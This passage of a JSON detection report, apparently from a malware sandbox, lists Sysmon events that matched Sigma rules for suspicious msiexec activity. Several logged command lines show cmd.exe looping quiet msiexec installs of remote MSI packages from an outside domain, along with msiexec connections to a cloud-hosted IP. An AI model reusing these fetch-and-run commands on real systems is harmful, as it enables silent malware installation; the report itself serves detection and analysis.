                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                                                                                             "LogonId":  "251035",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392939",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "3400",
                                                                                             "ParentProcessGuid":  "{C784477D-A7AA-6371-5106-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-9BD4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A7EB-6371-5F06-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/george32095.msi ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 FOR %i IN (C:\\Windows\\system32\\*.*) DO msiexec -c /Q /i https://www.capmarketreport.com/george%random%.msi \u0026 timeout /t 60",
                                                                                             "ProcessId":  "2996",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                                                                                             "LogonId":  "251077",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392943",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "Medium",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "5024",
                                                                                             "ParentProcessGuid":  "{C784477D-A7AE-6371-5706-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-C5D4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A7EF-6371-6106-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/george32108.msi ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 FOR %i IN (C:\\Windows\\system32\\*.*) DO msiexec -c /Q /i https://www.capmarketreport.com/george%random%.msi \u0026 timeout /t 60",
                                                                                             "ProcessId":  "5248",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "269369cff6a753f9bd7a50d72f15b83a86911e2d6d46e1a38561ac385481c372",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Suspicious Msiexec Quiet Install",
                                                    "rule_description":  "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
                                                    "rule_author":  "frack113"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.2.12",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "https",
                                                                                             "UtcTime":  "1660802221",
                                                                                             "Initiated":  "true",
                                                                                             "DestinationIp":  "149.28.247.34",
                                                                                             "DestinationHostname":  "149.28.247.34.vultrusercontent.com",
                                                                                             "SourcePortName":  "-",
                                                                                             "RuleName":  "-",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "49709",
                                                                                             "SourceHostname":  "DESKTOP-B0T93D6.local"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "DestinationPort":  "80",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.2.12",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "http",
                                                                                             "UtcTime":  "1660802221",
                                                                                             "DestinationHostname":  "a23-52-55-67.deploy.static.akamaitechnologies.com",
                                                                                             "DestinationIp":  "23.52.55.67",
                                                                                             "SourceHostname":  "DESKTOP-B0T93D6.local",
                                                                                             "SourcePortName":  "-",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "49710",
                                                                                             "Initiated":  "true"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "true",
                                                                                             "DestinationPort":  "53",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "udp",
                                                                                             "SourceIp":  "c0a8:20c:8d0d:3612:f820:ba0b:82c9:ffff",
                                                                                             "DestinationIsIpv6":  "true",
                                                                                             "DestinationPortName":  "domain",
                                                                                             "UtcTime":  "1660802220",
                                                                                             "DestinationHostname":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "DestinationIp":  "808:808:498d:4f08:4889:7424:6848:8974",
                                                                                             "SourcePortName":  "-",
                                                                                             "RuleName":  "-",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "61788",
                                                                                             "SourceHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.2.12",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "https",
                                                                                             "UtcTime":  "1660802235",
                                                                                             "Initiated":  "true",
                                                                                             "DestinationIp":  "149.28.247.34",
                                                                                             "DestinationHostname":  "149.28.247.34.vultrusercontent.com",
                                                                                             "SourcePortName":  "-",
                                                                                             "RuleName":  "-",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "49713",
                                                                                             "SourceHostname":  "DESKTOP-B0T93D6.local"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.2.12",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "https",
                                                                                             "UtcTime":  "1660802239",
                                                                                             "DestinationHostname":  "149.28.247.34.vultrusercontent.com",
                                                                                             "DestinationIp":  "149.28.247.34",
                                                                                             "Initiated":  "true",
                                                                                             "SourcePortName":  "-",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "49714",
                                                                                             "SourceHostname":  "DESKTOP-B0T93D6.local"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.2.12",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "https",
                                                                                             "UtcTime":  "1660802297",
                                                                                             "DestinationHostname":  "149.28.247.34.vultrusercontent.com",
                                                                                             "Initiated":  "true",
                                                                                             "DestinationIp":  "149.28.247.34",
                                                                                             "SourcePortName":  "-",
                                                                                             "RuleName":  "-",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "49720",
                                                                                             "SourceHostname":  "DESKTOP-B0T93D6.local"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "NT AUTHORITY\\SYSTEM",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.2.12",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "https",
                                                                                             "UtcTime":  "1660802301",
                                                                                             "DestinationHostname":  "149.28.247.34.vultrusercontent.com",
                                                                                             "DestinationIp":  "149.28.247.34",
                                                                                             "Initiated":  "true",
                                                                                             "SourcePortName":  "-",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Image":  "C:\\Windows\\system32\\msiexec.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "{C784477D-A79F-6371-4C06-000000003000}",
                                                                                             "ProcessId":  "1216",
                                                                                             "SourcePort":  "49721",
                                                                                             "SourceHostname":  "DESKTOP-B0T93D6.local"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "4a7e3b52f438365db6b61867f157e3bc434b40fb9916eba681bb857e7a1041ee",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Msiexec Initiated Connection",
                                                    "rule_description":  "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
                                                    "rule_author":  "frack113"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\Desktop\\",
                                                                                             "LogonId":  "251035",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392862",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "5016",
                                                                                             "ParentProcessGuid":  "{C784477D-A79B-6371-4706-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-9BD4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A79E-6371-4B06-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/packageupd.msi?ccop=RoPbnVqYd ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 echo jbusguid\u003e C:\\Users\\george\\AppData\\Roaming\\Pass.txt \u0026 start C:\\Users\\george\\AppData\\Roaming\\Pass.txt \u0026\u0026 FOR %i IN (C:\\Windows\\system32\\msiexec.*) DO msiexec -c /Q /i https://www.capmarketreport.com/packageupd.msi?ccop=RoPbnVqYd \u0026 timeout",
                                                                                             "ProcessId":  "4012",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                                                                                             "LogonId":  "251035",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392877",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "3400",
                                                                                             "ParentProcessGuid":  "{C784477D-A7AA-6371-5106-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-9BD4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A7AD-6371-5506-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/george32095.msi ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 FOR %i IN (C:\\Windows\\system32\\*.*) DO msiexec -c /Q /i https://www.capmarketreport.com/george%random%.msi \u0026 timeout /t 60",
                                                                                             "ProcessId":  "6020",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                                                                                             "LogonId":  "251077",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392881",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "Medium",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "5024",
                                                                                             "ParentProcessGuid":  "{C784477D-A7AE-6371-5706-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-C5D4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A7B1-6371-5A06-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/george32108.msi ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 FOR %i IN (C:\\Windows\\system32\\*.*) DO msiexec -c /Q /i https://www.capmarketreport.com/george%random%.msi \u0026 timeout /t 60",
                                                                                             "ProcessId":  "5516",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                                                                                             "LogonId":  "251035",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392939",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "3400",
                                                                                             "ParentProcessGuid":  "{C784477D-A7AA-6371-5106-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-9BD4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A7EB-6371-5F06-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/george32095.msi ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 FOR %i IN (C:\\Windows\\system32\\*.*) DO msiexec -c /Q /i https://www.capmarketreport.com/george%random%.msi \u0026 timeout /t 60",
                                                                                             "ProcessId":  "2996",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                                                                                             "LogonId":  "251077",
                                                                                             "OriginalFileName":  "msiexec.exe",
                                                                                             "UtcTime":  "1668392943",
                                                                                             "Description":  "Windows\\xae installer",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=D3C21CD0C70DC36FDD8A61E4517A226D,SHA256=D7A94CE4C50764B8A6F67DB308F8609AC38F08D1113079EAF81A25AB44E72BA6,IMPHASH=13C7ACE23F99CD5FBC3ABD5C16BF2DCE",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\cmd.exe",
                                                                                             "IntegrityLevel":  "Medium",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\msiexec.exe",
                                                                                             "ParentProcessId":  "5024",
                                                                                             "ParentProcessGuid":  "{C784477D-A7AE-6371-5706-000000003000}",
                                                                                             "Product":  "Windows Installer - Unicode",
                                                                                             "LogonGuid":  "C784477D-D346-62FD-C5D4-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A7EF-6371-6106-000000003000}",
                                                                                             "CommandLine":  "msiexec  -c /Q /i https://www.capmarketreport.com/george32108.msi ",
                                                                                             "ParentCommandLine":  "\"C:\\Windows\\System32\\cmd.exe\" /c DeviceCredentialDeployment \u0026 FOR %i IN (C:\\Windows\\system32\\*.*) DO msiexec -c /Q /i https://www.capmarketreport.com/george%random%.msi \u0026 timeout /t 60",
                                                                                             "ProcessId":  "5248",
                                                                                             "FileVersion":  "5.0.17134.228 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "62641a1f33f67c78cb5f920f86788ab9e084dd90a20f1bbe56bd0de87f85b129",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Suspicious Msiexec Quiet Install From Remote Location",
                                                    "rule_description":  "Detects usage of Msiexec.exe to install packages hosted remotely quietly",
                                                    "rule_author":  "Nasreddine Bencherchali"
                                                },
